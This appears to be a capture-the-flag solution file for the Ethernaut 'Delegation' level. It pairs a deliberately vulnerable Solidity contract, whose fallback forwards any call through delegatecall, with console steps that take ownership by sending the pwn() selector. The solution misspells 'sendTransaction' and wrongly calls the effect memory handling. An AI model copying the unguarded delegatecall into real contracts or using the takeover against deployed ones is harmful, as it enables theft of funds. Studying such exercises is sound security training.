// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/* 

Delegation
Level completed!
Difficulty 4/10

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
Fallback methods
Method ids
Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the The Parity Wallet Hack Explained article for an accurate explanation of how this idea was used to steal 30M USD.
 */


// SOLUTION
/* 

    1. check the abi to confirm that `Delegation` contract is the one that had been deployed:
    using the command `contract.abi`

    2. Confirm that the owner isn't yet you
    await contract.owner()

    3. Get the signed signature of the pwn function in Delegate contract
    
    let encodedFunctionSignature = web3.utils.sha3("pwn()");
    console.log(encodedFunctionSignature);

    4. SendTraction which calls the fallback function of the Delegation contract
    await contract.sendTraction({data: encodedFunctionSignature});

    The above will invoke the fallback function which in turn calls the pwn function but 
    in the context of the `Delegation` contract. In other words, although the pwn function
    from the Delegate contract is called, it will change the variables(in this case, the owner)
    of the `Delegation` contract. 
    This is due to how solidity handles memory.

    See more: 
    https://solidity-by-example.org/delegatecall/


    https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/

 */

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
